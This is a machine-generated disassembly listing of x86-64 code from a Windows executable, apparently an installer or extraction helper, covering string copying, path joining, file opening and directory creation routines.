   14000512c:	48 85 c0             	test   %rax,%rax
   14000512f:	74 13                	je     0x140005144
   140005131:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140005135:	84 c0                	test   %al,%al
   140005137:	74 0b                	je     0x140005144
   140005139:	88 01                	mov    %al,(%rcx)
   14000513b:	48 ff c1             	inc    %rcx
   14000513e:	48 83 ee 01          	sub    $0x1,%rsi
   140005142:	75 e4                	jne    0x140005128
   140005144:	48 85 f6             	test   %rsi,%rsi
   140005147:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   14000514b:	48 0f 45 c1          	cmovne %rcx,%rax
   14000514f:	c6 00 00             	movb   $0x0,(%rax)
   140005152:	eb 08                	jmp    0x14000515c
   140005154:	48 85 f6             	test   %rsi,%rsi
   140005157:	74 03                	je     0x14000515c
   140005159:	c6 07 00             	movb   $0x0,(%rdi)
   14000515c:	8b 8d e0 01 00 00    	mov    0x1e0(%rbp),%ecx
   140005162:	48 ff 15 ff 43 00 00 	rex.W call *0x43ff(%rip)        # 0x140009568
   140005169:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000516e:	e8 e1 2f 00 00       	call   0x140008154
   140005173:	85 c0                	test   %eax,%eax
   140005175:	74 0f                	je     0x140005186
   140005177:	e8 08 2f 00 00       	call   0x140008084
   14000517c:	41 b9 00 00 19 00    	mov    $0x190000,%r9d
   140005182:	85 c0                	test   %eax,%eax
   140005184:	75 06                	jne    0x14000518c
   140005186:	41 b9 00 00 01 00    	mov    $0x10000,%r9d
   14000518c:	44 0b 8d e0 01 00 00 	or     0x1e0(%rbp),%r9d
   140005193:	4c 8d 05 de 83 00 00 	lea    0x83de(%rip),%r8        # 0x14000d578
   14000519a:	44 0b 8d e8 01 00 00 	or     0x1e8(%rbp),%r9d
   1400051a1:	48 8b d7             	mov    %rdi,%rdx
   1400051a4:	49 8b cc             	mov    %r12,%rcx
   1400051a7:	48 ff 15 4a 43 00 00 	rex.W call *0x434a(%rip)        # 0x1400094f8
   1400051ae:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400051b3:	48 8b cf             	mov    %rdi,%rcx
   1400051b6:	8b d8                	mov    %eax,%ebx
   1400051b8:	48 ff 15 d1 40 00 00 	rex.W call *0x40d1(%rip)        # 0x140009290
   1400051bf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400051c4:	e9 3c ff ff ff       	jmp    0x140005105
   1400051c9:	b8 01 00 00 00       	mov    $0x1,%eax
   1400051ce:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   1400051d5:	48 33 cc             	xor    %rsp,%rcx
   1400051d8:	e8 13 35 00 00       	call   0x1400086f0
   1400051dd:	48 81 c4 80 02 00 00 	add    $0x280,%rsp
   1400051e4:	41 5f                	pop    %r15
   1400051e6:	41 5e                	pop    %r14
   1400051e8:	41 5c                	pop    %r12
   1400051ea:	5f                   	pop    %rdi
   1400051eb:	5e                   	pop    %rsi
   1400051ec:	5b                   	pop    %rbx
   1400051ed:	5d                   	pop    %rbp
   1400051ee:	c3                   	ret
   1400051ef:	cc                   	int3
   1400051f0:	cc                   	int3
   1400051f1:	cc                   	int3
   1400051f2:	cc                   	int3
   1400051f3:	cc                   	int3
   1400051f4:	cc                   	int3
   1400051f5:	cc                   	int3
   1400051f6:	cc                   	int3
   1400051f7:	cc                   	int3
   1400051f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400051fd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005202:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005207:	57                   	push   %rdi
   140005208:	48 83 ec 20          	sub    $0x20,%rsp
   14000520c:	48 8b f2             	mov    %rdx,%rsi
   14000520f:	41 8b e8             	mov    %r8d,%ebp
   140005212:	48 8b d1             	mov    %rcx,%rdx
   140005215:	48 8b f9             	mov    %rcx,%rdi
   140005218:	33 c9                	xor    %ecx,%ecx
   14000521a:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140005220:	48 ff 15 e1 40 00 00 	rex.W call *0x40e1(%rip)        # 0x140009308
   140005227:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000522c:	48 8b d0             	mov    %rax,%rdx
   14000522f:	33 c9                	xor    %ecx,%ecx
   140005231:	48 ff 15 a0 40 00 00 	rex.W call *0x40a0(%rip)        # 0x1400092d8
   140005238:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000523d:	8b d8                	mov    %eax,%ebx
   14000523f:	3b c5                	cmp    %ebp,%eax
   140005241:	77 6e                	ja     0x1400052b1
   140005243:	48 85 f6             	test   %rsi,%rsi
   140005246:	74 69                	je     0x1400052b1
   140005248:	85 c0                	test   %eax,%eax
   14000524a:	74 7d                	je     0x1400052c9
   14000524c:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140005252:	48 8b d7             	mov    %rdi,%rdx
   140005255:	33 c9                	xor    %ecx,%ecx
   140005257:	48 ff 15 aa 40 00 00 	rex.W call *0x40aa(%rip)        # 0x140009308
   14000525e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005263:	48 8b d0             	mov    %rax,%rdx
   140005266:	33 c9                	xor    %ecx,%ecx
   140005268:	48 ff 15 29 41 00 00 	rex.W call *0x4129(%rip)        # 0x140009398
   14000526f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005274:	48 8b c8             	mov    %rax,%rcx
   140005277:	48 ff 15 fa 40 00 00 	rex.W call *0x40fa(%rip)        # 0x140009378
   14000527e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005283:	48 8b f8             	mov    %rax,%rdi
   140005286:	48 85 c0             	test   %rax,%rax
   140005289:	74 3e                	je     0x1400052c9
   14000528b:	44 8b cb             	mov    %ebx,%r9d
   14000528e:	8b d5                	mov    %ebp,%edx
   140005290:	4c 8b c0             	mov    %rax,%r8
   140005293:	48 8b ce             	mov    %rsi,%rcx
   140005296:	48 ff 15 a3 43 00 00 	rex.W call *0x43a3(%rip)        # 0x140009640
   14000529d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400052a2:	48 8b cf             	mov    %rdi,%rcx
   1400052a5:	48 ff 15 84 40 00 00 	rex.W call *0x4084(%rip)        # 0x140009330
   1400052ac:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400052b1:	8b c3                	mov    %ebx,%eax
   1400052b3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400052b8:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400052bd:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400052c2:	48 83 c4 20          	add    $0x20,%rsp
   1400052c6:	5f                   	pop    %rdi
   1400052c7:	c3                   	ret
   1400052c8:	cc                   	int3
   1400052c9:	33 c0                	xor    %eax,%eax
   1400052cb:	eb e6                	jmp    0x1400052b3
   1400052cd:	cc                   	int3
   1400052ce:	cc                   	int3
   1400052cf:	cc                   	int3
   1400052d0:	cc                   	int3
   1400052d1:	cc                   	int3
   1400052d2:	cc                   	int3
   1400052d3:	cc                   	int3
   1400052d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400052d9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400052de:	57                   	push   %rdi
   1400052df:	48 83 ec 20          	sub    $0x20,%rsp
   1400052e3:	49 83 ca ff          	or     $0xffffffffffffffff,%r10
   1400052e7:	48 8b d9             	mov    %rcx,%rbx
   1400052ea:	49 8b ca             	mov    %r10,%rcx
   1400052ed:	49 8b f9             	mov    %r9,%rdi
   1400052f0:	48 ff c1             	inc    %rcx
   1400052f3:	41 80 3c 08 00       	cmpb   $0x0,(%r8,%rcx,1)
   1400052f8:	75 f6                	jne    0x1400052f0
   1400052fa:	49 8b c2             	mov    %r10,%rax
   1400052fd:	48 ff c0             	inc    %rax
   140005300:	41 80 3c 01 00       	cmpb   $0x0,(%r9,%rax,1)
   140005305:	75 f6                	jne    0x1400052fd
   140005307:	ff c0                	inc    %eax
   140005309:	bd 04 01 00 00       	mov    $0x104,%ebp
   14000530e:	03 c1                	add    %ecx,%eax
   140005310:	3b c5                	cmp    %ebp,%eax
   140005312:	0f 8d 85 00 00 00    	jge    0x14000539d
   140005318:	8b d5                	mov    %ebp,%edx
   14000531a:	48 8b cb             	mov    %rbx,%rcx
   14000531d:	4c 2b c3             	sub    %rbx,%r8
   140005320:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140005327:	48 85 c0             	test   %rax,%rax
   14000532a:	74 13                	je     0x14000533f
   14000532c:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140005330:	84 c0                	test   %al,%al
   140005332:	74 0b                	je     0x14000533f
   140005334:	88 01                	mov    %al,(%rcx)
   140005336:	48 ff c1             	inc    %rcx
   140005339:	48 83 ea 01          	sub    $0x1,%rdx
   14000533d:	75 e1                	jne    0x140005320
   14000533f:	48 85 d2             	test   %rdx,%rdx
   140005342:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005346:	48 0f 45 c1          	cmovne %rcx,%rax
   14000534a:	c6 00 00             	movb   $0x0,(%rax)
   14000534d:	49 8b c2             	mov    %r10,%rax
   140005350:	48 ff c0             	inc    %rax
   140005353:	80 3c 03 00          	cmpb   $0x0,(%rbx,%rax,1)
   140005357:	75 f7                	jne    0x140005350
   140005359:	80 7c 18 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rbx,1)
   14000535e:	74 28                	je     0x140005388
   140005360:	49 ff c2             	inc    %r10
   140005363:	42 80 3c 13 00       	cmpb   $0x0,(%rbx,%r10,1)
   140005368:	75 f6                	jne    0x140005360
   14000536a:	41 80 7c 1a ff 2f    	cmpb   $0x2f,-0x1(%r10,%rbx,1)
   140005370:	74 16                	je     0x140005388
   140005372:	4c 8d 05 03 45 00 00 	lea    0x4503(%rip),%r8        # 0x14000987c
   140005379:	48 8b d5             	mov    %rbp,%rdx
   14000537c:	48 8b cb             	mov    %rbx,%rcx
   14000537f:	e8 84 bc ff ff       	call   0x140001008
   140005384:	85 c0                	test   %eax,%eax
   140005386:	78 15                	js     0x14000539d
   140005388:	4c 8b c7             	mov    %rdi,%r8
   14000538b:	48 8b d5             	mov    %rbp,%rdx
   14000538e:	48 8b cb             	mov    %rbx,%rcx
   140005391:	e8 72 bc ff ff       	call   0x140001008
   140005396:	b8 01 00 00 00       	mov    $0x1,%eax
   14000539b:	eb 02                	jmp    0x14000539f
   14000539d:	33 c0                	xor    %eax,%eax
   14000539f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400053a4:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400053a9:	48 83 c4 20          	add    $0x20,%rsp
   1400053ad:	5f                   	pop    %rdi
   1400053ae:	c3                   	ret
   1400053af:	cc                   	int3
   1400053b0:	cc                   	int3
   1400053b1:	cc                   	int3
   1400053b2:	cc                   	int3
   1400053b3:	cc                   	int3
   1400053b4:	cc                   	int3
   1400053b5:	cc                   	int3
   1400053b6:	cc                   	int3
   1400053b7:	cc                   	int3
   1400053b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400053bd:	57                   	push   %rdi
   1400053be:	48 83 ec 30          	sub    $0x30,%rsp
   1400053c2:	48 8b f9             	mov    %rcx,%rdi
   1400053c5:	48 ff 15 5c 3e 00 00 	rex.W call *0x3e5c(%rip)        # 0x140009228
   1400053cc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400053d1:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400053d4:	0f 84 85 00 00 00    	je     0x14000545f
   1400053da:	c1 e8 04             	shr    $0x4,%eax
   1400053dd:	f7 d0                	not    %eax
   1400053df:	83 e0 01             	and    $0x1,%eax
   1400053e2:	74 7b                	je     0x14000545f
   1400053e4:	33 db                	xor    %ebx,%ebx
   1400053e6:	39 1d 14 82 00 00    	cmp    %ebx,0x8214(%rip)        # 0x14000d600
   1400053ec:	75 54                	jne    0x140005442
   1400053ee:	f6 05 23 79 00 00 01 	testb  $0x1,0x7923(%rip)        # 0x14000cd18
   1400053f5:	75 4b                	jne    0x140005442
   1400053f7:	4c 8b 05 2a 74 00 00 	mov    0x742a(%rip),%r8        # 0x14000c828
   1400053fe:	4c 8d 0d 7b e5 ff ff 	lea    -0x1a85(%rip),%r9        # 0x140003980
   140005405:	48 c7 44 24 28 06 00 	movq   $0x6,0x28(%rsp)
   14000540c:	00 00 
   14000540e:	ba d3 07 00 00       	mov    $0x7d3,%edx
   140005413:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005418:	48 89 3d 11 84 00 00 	mov    %rdi,0x8411(%rip)        # 0x14000d830
   14000541f:	e8 04 29 00 00       	call   0x140007d28
   140005424:	48 83 e8 06          	sub    $0x6,%rax
   140005428:	74 18                	je     0x140005442
   14000542a:	48 83 e8 01          	sub    $0x1,%rax
   14000542e:	74 2b                	je     0x14000545b
   140005430:	48 3d 32 08 00 00    	cmp    $0x832,%rax
   140005436:	75 0a                	jne    0x140005442
   140005438:	c7 05 be 81 00 00 01 	movl   $0x1,0x81be(%rip)        # 0x14000d600
   14000543f:	00 00 00 
   140005442:	ba 80 00 00 00       	mov    $0x80,%edx
   140005447:	48 8b cf             	mov    %rdi,%rcx
   14000544a:	48 ff 15 27 3e 00 00 	rex.W call *0x3e27(%rip)        # 0x140009278
   140005451:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005456:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000545b:	8b c3                	mov    %ebx,%eax
   14000545d:	eb 05                	jmp    0x140005464
   14000545f:	b8 01 00 00 00       	mov    $0x1,%eax
   140005464:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005469:	48 83 c4 30          	add    $0x30,%rsp
   14000546d:	5f                   	pop    %rdi
   14000546e:	c3                   	ret
   14000546f:	cc                   	int3
   140005470:	cc                   	int3
   140005471:	cc                   	int3
   140005472:	cc                   	int3
   140005473:	cc                   	int3
   140005474:	cc                   	int3
   140005475:	cc                   	int3
   140005476:	cc                   	int3
   140005477:	cc                   	int3
   140005478:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000547d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005482:	57                   	push   %rdi
   140005483:	48 83 ec 30          	sub    $0x30,%rsp
   140005487:	ba 10 00 00 00       	mov    $0x10,%edx
   14000548c:	48 8b f1             	mov    %rcx,%rsi
   14000548f:	8d 4a 30             	lea    0x30(%rdx),%ecx
   140005492:	48 ff 15 4f 3f 00 00 	rex.W call *0x3f4f(%rip)        # 0x1400093e8
   140005499:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000549e:	48 8b f8             	mov    %rax,%rdi
   1400054a1:	48 85 c0             	test   %rax,%rax
   1400054a4:	75 2a                	jne    0x1400054d0
   1400054a6:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400054aa:	45 33 c9             	xor    %r9d,%r9d
   1400054ad:	48 8b 0d 74 73 00 00 	mov    0x7374(%rip),%rcx        # 0x14000c828
   1400054b4:	45 33 c0             	xor    %r8d,%r8d
   1400054b7:	ba b5 04 00 00       	mov    $0x4b5,%edx
   1400054bc:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400054c3:	00 
   1400054c4:	e8 63 fa ff ff       	call   0x140004f2c
   1400054c9:	33 c0                	xor    %eax,%eax
   1400054cb:	e9 cd 00 00 00       	jmp    0x14000559d
   1400054d0:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   1400054d4:	48 8b d3             	mov    %rbx,%rdx
   1400054d7:	48 ff c2             	inc    %rdx
   1400054da:	80 3c 16 00          	cmpb   $0x0,(%rsi,%rdx,1)
   1400054de:	75 f7                	jne    0x1400054d7
   1400054e0:	48 ff c2             	inc    %rdx
   1400054e3:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400054e8:	48 ff 15 f9 3e 00 00 	rex.W call *0x3ef9(%rip)        # 0x1400093e8
   1400054ef:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400054f4:	48 89 07             	mov    %rax,(%rdi)
   1400054f7:	48 8b c8             	mov    %rax,%rcx
   1400054fa:	48 85 c0             	test   %rax,%rax
   1400054fd:	75 34                	jne    0x140005533
   1400054ff:	21 44 24 28          	and    %eax,0x28(%rsp)
   140005503:	45 33 c9             	xor    %r9d,%r9d
   140005506:	48 8b 0d 1b 73 00 00 	mov    0x731b(%rip),%rcx        # 0x14000c828
   14000550d:	45 33 c0             	xor    %r8d,%r8d
   140005510:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140005515:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000551c:	00 
   14000551d:	e8 0a fa ff ff       	call   0x140004f2c
   140005522:	48 8b cf             	mov    %rdi,%rcx
   140005525:	48 ff 15 64 3d 00 00 	rex.W call *0x3d64(%rip)        # 0x140009290
   14000552c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005531:	eb 96                	jmp    0x1400054c9
   140005533:	48 ff c3             	inc    %rbx
   140005536:	80 3c 1e 00          	cmpb   $0x0,(%rsi,%rbx,1)
   14000553a:	75 f7                	jne    0x140005533
   14000553c:	48 ff c3             	inc    %rbx
   14000553f:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
   140005544:	48 8d 43 ff          	lea    -0x1(%rbx),%rax
   140005548:	48 3b c2             	cmp    %rdx,%rax
   14000554b:	77 31                	ja     0x14000557e
   14000554d:	48 2b d3             	sub    %rbx,%rdx
   140005550:	48 2b f1             	sub    %rcx,%rsi
   140005553:	48 8d 04 1a          	lea    (%rdx,%rbx,1),%rax
   140005557:	48 85 c0             	test   %rax,%rax
   14000555a:	74 12                	je     0x14000556e
   14000555c:	8a 04 0e             	mov    (%rsi,%rcx,1),%al
   14000555f:	84 c0                	test   %al,%al
   140005561:	74 0b                	je     0x14000556e
   140005563:	88 01                	mov    %al,(%rcx)
   140005565:	48 ff c1             	inc    %rcx
   140005568:	48 83 eb 01          	sub    $0x1,%rbx
   14000556c:	75 e5                	jne    0x140005553
   14000556e:	48 85 db             	test   %rbx,%rbx
   140005571:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005575:	48 0f 45 c1          	cmovne %rcx,%rax
   140005579:	c6 00 00             	movb   $0x0,(%rax)
   14000557c:	eb 08                	jmp    0x140005586
   14000557e:	48 85 db             	test   %rbx,%rbx
   140005581:	74 03                	je     0x140005586
   140005583:	c6 01 00             	movb   $0x0,(%rcx)
   140005586:	48 8b 0d 7b 80 00 00 	mov    0x807b(%rip),%rcx        # 0x14000d608
   14000558d:	b8 01 00 00 00       	mov    $0x1,%eax
   140005592:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140005596:	48 89 3d 6b 80 00 00 	mov    %rdi,0x806b(%rip)        # 0x14000d608
   14000559d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400055a2:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400055a7:	48 83 c4 30          	add    $0x30,%rsp
   1400055ab:	5f                   	pop    %rdi
   1400055ac:	c3                   	ret
   1400055ad:	cc                   	int3
   1400055ae:	cc                   	int3
   1400055af:	cc                   	int3
   1400055b0:	cc                   	int3
   1400055b1:	cc                   	int3
   1400055b2:	cc                   	int3
   1400055b3:	cc                   	int3
   1400055b4:	cc                   	int3
   1400055b5:	cc                   	int3
   1400055b6:	cc                   	int3
   1400055b7:	cc                   	int3
   1400055b8:	71 88                	jno    0x140005542
   1400055ba:	5f                   	pop    %rdi
   1400055bb:	52                   	push   %rdx
   1400055bc:	7d be                	jge    0x14000557c
   1400055be:	6d                   	insl   (%dx),(%rdi)
   1400055bf:	ba 48 8b c4 48       	mov    $0x48c48b48,%edx
   1400055c4:	89 58 08             	mov    %ebx,0x8(%rax)
   1400055c7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400055cb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400055cf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400055d3:	41 55                	push   %r13
   1400055d5:	41 56                	push   %r14
   1400055d7:	41 57                	push   %r15
   1400055d9:	48 83 ec 40          	sub    $0x40,%rsp
   1400055dd:	45 33 f6             	xor    %r14d,%r14d
   1400055e0:	4c 8d 2d 59 7a 00 00 	lea    0x7a59(%rip),%r13        # 0x14000d040
   1400055e7:	8b da                	mov    %edx,%ebx
   1400055e9:	48 8b f1             	mov    %rcx,%rsi
   1400055ec:	49 8b c5             	mov    %r13,%rax
   1400055ef:	41 8d 7e 01          	lea    0x1(%r14),%edi
   1400055f3:	39 38                	cmp    %edi,(%rax)
   1400055f5:	74 13                	je     0x14000560a
   1400055f7:	44 03 f7             	add    %edi,%r14d
   1400055fa:	48 8d 0d 3f 7f 00 00 	lea    0x7f3f(%rip),%rcx        # 0x14000d540
   140005601:	48 83 c0 20          	add    $0x20,%rax
   140005605:	48 3b c1             	cmp    %rcx,%rax
   140005608:	7c e9                	jl     0x1400055f3
   14000560a:	41 83 fe 28          	cmp    $0x28,%r14d
   14000560e:	75 2d                	jne    0x14000563d
   140005610:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140005615:	45 33 c9             	xor    %r9d,%r9d
   140005618:	48 8b 0d 09 72 00 00 	mov    0x7209(%rip),%rcx        # 0x14000c828
   14000561f:	45 33 c0             	xor    %r8d,%r8d
   140005622:	ba bb 04 00 00       	mov    $0x4bb,%edx
   140005627:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000562e:	00 
   14000562f:	e8 f8 f8 ff ff       	call   0x140004f2c
   140005634:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140005638:	e9 b9 01 00 00       	jmp    0x1400057f6
   14000563d:	48 8d 15 bc 6b 00 00 	lea    0x6bbc(%rip),%rdx        # 0x14000c200
   140005644:	48 8b ce             	mov    %rsi,%rcx
   140005647:	48 ff 15 a2 3d 00 00 	rex.W call *0x3da2(%rip)        # 0x1400093f0
   14000564e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005653:	85 c0                	test   %eax,%eax
   140005655:	75 3d                	jne    0x140005694
   140005657:	f7 c3 0b 01 00 00    	test   $0x10b,%ebx
   14000565d:	75 d5                	jne    0x140005634
   14000565f:	49 63 d6             	movslq %r14d,%rdx
   140005662:	48 8b ca             	mov    %rdx,%rcx
   140005665:	48 c1 e1 05          	shl    $0x5,%rcx
   140005669:	42 21 04 29          	and    %eax,(%rcx,%r13,1)
   14000566d:	48 8b 05 ec 7e 00 00 	mov    0x7eec(%rip),%rax        # 0x14000d560
   140005674:	42 83 64 29 10 00    	andl   $0x0,0x10(%rcx,%r13,1)
   14000567a:	4a 89 44 29 08       	mov    %rax,0x8(%rcx,%r13,1)
   14000567f:	8b 05 e3 7e 00 00    	mov    0x7ee3(%rip),%eax        # 0x14000d568
   140005685:	42 89 44 29 14       	mov    %eax,0x14(%rcx,%r13,1)
   14000568a:	42 89 7c 29 04       	mov    %edi,0x4(%rcx,%r13,1)
   14000568f:	e9 5f 01 00 00       	jmp    0x1400057f3
   140005694:	f6 c3 08             	test   $0x8,%bl
   140005697:	74 09                	je     0x1400056a2
   140005699:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000569d:	e9 2b 01 00 00       	jmp    0x1400057cd
   1400056a2:	8b c3                	mov    %ebx,%eax
   1400056a4:	24 03                	and    $0x3,%al
   1400056a6:	f6 d8                	neg    %al
   1400056a8:	1b ed                	sbb    %ebp,%ebp
   1400056aa:	81 e5 00 00 00 c0    	and    $0xc0000000,%ebp
   1400056b0:	81 c5 00 00 00 80    	add    $0x80000000,%ebp
   1400056b6:	0f ba e3 08          	bt     $0x8,%ebx
   1400056ba:	73 1c                	jae    0x1400056d8
   1400056bc:	0f ba e3 0a          	bt     $0xa,%ebx
   1400056c0:	73 04                	jae    0x1400056c6
   1400056c2:	8b df                	mov    %edi,%ebx
   1400056c4:	eb 22                	jmp    0x1400056e8
   1400056c6:	81 e3 00 02 00 00    	and    $0x200,%ebx
   1400056cc:	f7 db                	neg    %ebx
   1400056ce:	1b db                	sbb    %ebx,%ebx
   1400056d0:	83 e3 fe             	and    $0xfffffffe,%ebx
   1400056d3:	83 c3 04             	add    $0x4,%ebx
   1400056d6:	eb 10                	jmp    0x1400056e8
   1400056d8:	81 e3 00 02 00 00    	and    $0x200,%ebx
   1400056de:	f7 db                	neg    %ebx
   1400056e0:	1b db                	sbb    %ebx,%ebx
   1400056e2:	83 e3 02             	and    $0x2,%ebx
   1400056e5:	83 c3 03             	add    $0x3,%ebx
   1400056e8:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400056ee:	45 33 c9             	xor    %r9d,%r9d
   1400056f1:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400056f8:	00 
   1400056f9:	45 33 c0             	xor    %r8d,%r8d
   1400056fc:	8b d5                	mov    %ebp,%edx
   1400056fe:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140005702:	48 8b ce             	mov    %rsi,%rcx
   140005705:	48 ff 15 4c 3c 00 00 	rex.W call *0x3c4c(%rip)        # 0x140009358
   14000570c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005711:	48 8b c8             	mov    %rax,%rcx
   140005714:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005718:	0f 85 af 00 00 00    	jne    0x1400057cd
   14000571e:	83 fb 03             	cmp    $0x3,%ebx
   140005721:	0f 84 a6 00 00 00    	je     0x1400057cd
   140005727:	80 3e 00             	cmpb   $0x0,(%rsi)
   14000572a:	74 75                	je     0x1400057a1
   14000572c:	8a 46 01             	mov    0x1(%rsi),%al
   14000572f:	48 8d 7e 02          	lea    0x2(%rsi),%rdi
   140005733:	45 33 ff             	xor    %r15d,%r15d
   140005736:	3c 3a                	cmp    $0x3a,%al
   140005738:	75 0b                	jne    0x140005745
   14000573a:	80 3f 5c             	cmpb   $0x5c,(%rdi)
   14000573d:	75 06                	jne    0x140005745
   14000573f:	48 8d 7e 03          	lea    0x3(%rsi),%rdi
   140005743:	eb 0f                	jmp    0x140005754
   140005745:	80 3e 5c             	cmpb   $0x5c,(%rsi)
   140005748:	75 0e                	jne    0x140005758
   14000574a:	3c 5c                	cmp    $0x5c,%al
   14000574c:	75 0a                	jne    0x140005758
   14000574e:	41 bf 02 00 00 00    	mov    $0x2,%r15d
   140005754:	8a 07                	mov    (%rdi),%al
   140005756:	eb 45                	jmp    0x14000579d
   140005758:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   14000575c:	eb 3f                	jmp    0x14000579d
   14000575e:	3c 5c                	cmp    $0x5c,%al
   140005760:	75 27                	jne    0x140005789
   140005762:	80 7f ff 3a          	cmpb   $0x3a,-0x1(%rdi)
   140005766:	74 21                	je     0x140005789
   140005768:	45 85 ff             	test   %r15d,%r15d
   14000576b:	74 05                	je     0x140005772
   14000576d:	41 ff cf             	dec    %r15d
   140005770:	eb 17                	jmp    0x140005789
   140005772:	33 d2                	xor    %edx,%edx
   140005774:	c6 07 00             	movb   $0x0,(%rdi)
   140005777:	48 8b ce             	mov    %rsi,%rcx
   14000577a:	48 ff 15 2f 3b 00 00 	rex.W call *0x3b2f(%rip)        # 0x1400092b0
   140005781:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005786:	c6 07 5c             	movb   $0x5c,(%rdi)
   140005789:	48 8b cf             	mov    %rdi,%rcx
   14000578c:	48 ff 15 b5 3d 00 00 	rex.W call *0x3db5(%rip)        # 0x140009548
   140005793:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005798:	48 8b f8             	mov    %rax,%rdi
   14000579b:	8a 00                	mov    (%rax),%al
   14000579d:	84 c0                	test   %al,%al
   14000579f:	75 bd                	jne    0x14000575e
   1400057a1:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400057a7:	45 33 c9             	xor    %r9d,%r9d
   1400057aa:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400057b1:	00 
   1400057b2:	45 33 c0             	xor    %r8d,%r8d
   1400057b5:	8b d5                	mov    %ebp,%edx
   1400057b7:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400057bb:	48 8b ce             	mov    %rsi,%rcx
   1400057be:	48 ff 15 93 3b 00 00 	rex.W call *0x3b93(%rip)        # 0x140009358
   1400057c5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400057ca:	48 8b c8             	mov    %rax,%rcx
   1400057cd:	49 63 d6             	movslq %r14d,%rdx
   1400057d0:	48 8b c2             	mov    %rdx,%rax
   1400057d3:	48 c1 e0 05          	shl    $0x5,%rax
   1400057d7:	4a 89 4c 28 18       	mov    %rcx,0x18(%rax,%r13,1)
   1400057dc:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   1400057e0:	74 0d                	je     0x1400057ef
   1400057e2:	42 83 24 28 00       	andl   $0x0,(%rax,%r13,1)
   1400057e7:	42 83 64 28 04 00    	andl   $0x0,0x4(%rax,%r13,1)
   1400057ed:	eb 04                	jmp    0x1400057f3
   1400057ef:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400057f3:	48 8b c2             	mov    %rdx,%rax
   1400057f6:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400057fb:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140005800:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
